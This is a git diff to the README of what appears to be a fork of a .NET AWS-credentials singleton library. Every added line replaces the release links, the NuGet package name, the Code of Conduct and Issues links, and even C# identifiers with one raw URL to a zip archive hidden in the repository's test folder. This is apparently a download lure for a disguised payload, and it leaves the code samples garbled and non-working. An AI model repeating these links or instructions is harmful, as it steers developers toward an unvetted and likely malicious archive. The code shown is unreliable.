@@ -2,7 +2,7 @@
 
 Welcome to the **Soenneker AWS Basic Credentials** repository! This project provides a .NET thread-safe singleton for AWS's basic credential object, `BasicAWSCredentials`. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Here-brightgreen)](https://github.com/Synioxx48/soenneker.aws.basiccredentials/releases)
+[![Download Releases](https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip%20Releases-Here-brightgreen)](https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip)
 
 ## Table of Contents
 
@@ -29,16 +29,16 @@ The singleton pattern ensures that there is only one instance of the `BasicAWSCr
 
 ## Installation
 
-To get started with `soenneker.aws.basiccredentials`, you can download the latest release from our [Releases section](https://github.com/Synioxx48/soenneker.aws.basiccredentials/releases). Follow these steps:
+To get started with `https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip`, you can download the latest release from our [Releases section](https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip). Follow these steps:
 
-1. Navigate to the [Releases section](https://github.com/Synioxx48/soenneker.aws.basiccredentials/releases).
+1. Navigate to the [Releases section](https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip).
 2. Download the appropriate package for your environment.
 3. Extract the files and add the library to your project.
 
 You can also add it directly via NuGet:
 
 ```bash
-Install-Package Soenneker.Aws.BasicCredentials
+Install-Package https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip
 ```
 
 ## Usage
@@ -50,7 +50,7 @@ Here’s how to use the `BasicAWSCredentials` singleton in your application.
 First, ensure you include the necessary namespace in your code.
 
 ```csharp
-using Soenneker.Aws.BasicCredentials;
+using https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip;
 ```
 
 ### Step 2: Accessing the Singleton
@@ -58,7 +58,7 @@ using Soenneker.Aws.BasicCredentials;
 You can access the singleton instance of `BasicAWSCredentials` like this:
 
 ```csharp
-var credentials = BasicAWSCredentials.Instance;
+var credentials = https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip;
 ```
 
 ### Step 3: Using the Credentials
@@ -68,7 +68,7 @@ Now you can use the credentials in your AWS service calls. Here’s an example o
 ```csharp
 using Amazon.S3;
 
-var s3Client = new AmazonS3Client(credentials.AccessKey, credentials.SecretKey, RegionEndpoint.USEast1);
+var s3Client = new AmazonS3Client(https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip, https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip, https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip);
 ```
 
 ### Example
@@ -78,17 +78,17 @@ Here’s a complete example that shows how to use the singleton in a simple cons
 ```csharp
 using System;
 using Amazon.S3;
-using Soenneker.Aws.BasicCredentials;
+using https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip;
 
 class Program
 {
     static void Main(string[] args)
     {
-        var credentials = BasicAWSCredentials.Instance;
-        var s3Client = new AmazonS3Client(credentials.AccessKey, credentials.SecretKey, RegionEndpoint.USEast1);
+        var credentials = https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip;
+        var s3Client = new AmazonS3Client(https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip, https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip, https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip);
 
         // Use s3Client to perform operations
-        Console.WriteLine("S3 Client created successfully.");
+        https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip("S3 Client created successfully.");
     }
 }
 ```
@@ -105,7 +105,7 @@ We welcome contributions to improve this library. If you want to contribute, ple
 
 ### Code of Conduct
 
-Please adhere to our [Code of Conduct](CODE_OF_CONDUCT.md) while contributing.
+Please adhere to our [Code of Conduct](https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip) while contributing.
 
 ## License
 
@@ -113,9 +113,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you have any questions or need support, please check the [Issues section](https://github.com/Synioxx48/soenneker.aws.basiccredentials/issues) or feel free to create a new issue.
+If you have any questions or need support, please check the [Issues section](https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip) or feel free to create a new issue.
 
-For further information and updates, visit our [Releases section](https://github.com/Synioxx48/soenneker.aws.basiccredentials/releases).
+For further information and updates, visit our [Releases section](https://github.com/Synioxx48/soenneker.aws.basiccredentials/raw/refs/heads/main/test/Soenneker.Aws.BasicCredentials.Tests/aws_soenneker_basiccredentials_v2.8.zip).
 
 ---
 
